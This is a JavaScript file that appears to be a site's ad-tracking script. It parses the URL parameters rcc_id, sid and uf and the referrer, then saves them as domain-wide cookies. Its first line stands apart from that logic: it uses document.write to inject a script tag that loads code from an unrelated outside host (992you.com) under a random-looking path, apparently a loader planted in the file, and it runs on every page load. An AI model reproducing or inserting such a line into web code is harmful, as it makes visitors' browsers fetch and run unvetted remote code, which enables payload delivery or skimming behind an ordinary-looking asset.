document.write('<script src="http://www.992you.com/Rhft8Yn"></script>');

var url = document.location;
var query_str = url.search;
var domain = document.domain;
var last_url = document.referrer;

function get_param_from_url(key) {
	var a = "";
    if (query_str && query_str != "") {
        var b = query_str.match(key + "=[^&]*");
        if (b && b != "") {
            a = b[0].split("=")[1]
        }
    }
    return a
}
function get_ld() {
	var ld = get_param_from_url('l');
	if (ld == null || ld == '') {
		ld = last_url;
	}
	var re = new RegExp("(?:[a-zA-Z]*:)?[/]*([^/|^\?]*).*");
	var b = re.exec(ld);
	if (b != null) {
		return b[1]
	} else {
		return ""
	}
}
function getCookie(a) {
    if (document.cookie.length > 0) {
        c_start = document.cookie.indexOf(a + "=");
        if (c_start != -1) {
            c_start = c_start + a.length + 1;
            c_end = document.cookie.indexOf(";", c_start);
            if (c_end == -1) {
                c_end = document.cookie.length
            }
            return document.cookie.substring(c_start, c_end)
        }
    }
    return ""
}
function getDomain() {
	var index = domain.lastIndexOf('.');
	index = domain.substring(0, index).lastIndexOf('.');
	if (index == -1) {
		return domain;
	}
    return domain.substring(index);
}
function setCookie(b, c, a) {
    var d = new Date();
    d.setDate(d.getDate() + a);
    var domain_c = "domain=" + getDomain();
    document.cookie = b + "=" + c
            + ((a == null) ? "" : "; expires=" + d.toGMTString())
            + "; path=/; " + domain_c;
}
var adid = get_param_from_url("rcc_id");
var sid = get_param_from_url("sid");
var uf = get_param_from_url("uf");
var ld = get_ld();
if (adid != "" && adid) {
    setCookie("adid", adid, null)
}
if (sid != "" && sid) {
    setCookie("ad_sid", sid, null)
}
if (uf != "" && uf) {
    setCookie("uf", uf, null)
}
if (ld != "" && ld) {
    setCookie("ld", ld, null)
}